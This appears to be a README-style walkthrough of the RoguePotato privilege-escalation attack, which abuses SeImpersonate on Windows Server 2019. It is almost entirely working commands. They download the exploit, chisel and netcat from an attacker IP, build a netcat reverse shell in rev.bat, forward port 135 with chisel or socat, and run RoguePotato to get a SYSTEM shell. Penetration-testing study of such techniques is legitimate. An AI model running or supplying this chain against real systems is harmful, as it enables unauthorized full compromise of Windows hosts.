# Rogue-Potato

[JuicyPotato](https://k4sth4.github.io/Juicy-Potato/) abused SeImpersonate or SeAssignPrimaryToken privileges to get execution as SYSTEM. 
But it fails against Windows Server 2019. RoguePotato can be use to abuse abused SeImpersonate Priviledge, if the target OS is Windows Server 2019.

# Exploitation

All we need is [RoguePotato.exe](https://github.com/k4sth4/Rogue-Potato/blob/main/RoguePotato.exe) , [Compatible Chisel for Win and Linux](https://github.com/k4sth4/Rogue-Potato) and [nc binary](https://github.com/k4sth4/Rogue-Potato).

### Upload all these on target machine

```markdown
powershell -c wget http://10.10.x.x:8080/RoguePotato.exe -outfile RoguePotato.exe
powershell -c wget http://10.10.x.x:8080/chiselx64.exe -outfile chisel.exe
powershell -c wget http://10.10.x.x:8080/nc64.exe -outfile nc64.exe
```

### Create a reverse shell on target machine and set chisel

```markdown
echo c:\\Windows\\Temp\\nc64.exe -e cmd 10.10.x.x 1234 > rev.bat
```

### Now run chisel on Attacker VM.
```markdown
./chisel server -p 8000 --reverse
```

### Now run chisle.exe on Traget Machine
```markdown
.\chisel.exe client 10.10.x.x:8000 R:135:localhost:9999
```
Note: 10.10.x.x is the Attacker IP.

We've open ports using chisel, now we can do the attack using RoguePotato.exe.

First we need to get another shell of the target user. As we can see that this shell is busy on port forwarding.
After gettng shell-2 we can set our listner on port that we've defined on rev.bat.

nc -nvlp 1234

## Getting Reverse Shell
### Now on shell-2 we can execute payload.

```markdown
.\RoguePotato.exe -r 10.10.x.x -l 9999 -e c:\\Windows\\Temp\\rev.bat
```

#### If you're using Powershell.
```markdown
.\RoguePotato.exe -r 10.10.x.x -l 9999 -e "powershell c:\\Windows\\Temp\\shell.ps1"
```

## Another Way Using socat

We can also use socat to port forward 135.
First set chisel on Kali vm as mentioned above.
Then on Target machine run chisel as:
```markdown
.\chisel.exe client 10.10.x.x:8000 R:9999:localhost:9999
```
Then set socat on Attacker VM (kali vm)
```markdown
socat tcp-listen:135,reuseaddr,fork tcp:127.0.0.1:9999
```
Now get another shell and run RoguePotato.exe as mentioned above you will get reverse shell as SYSTEM.

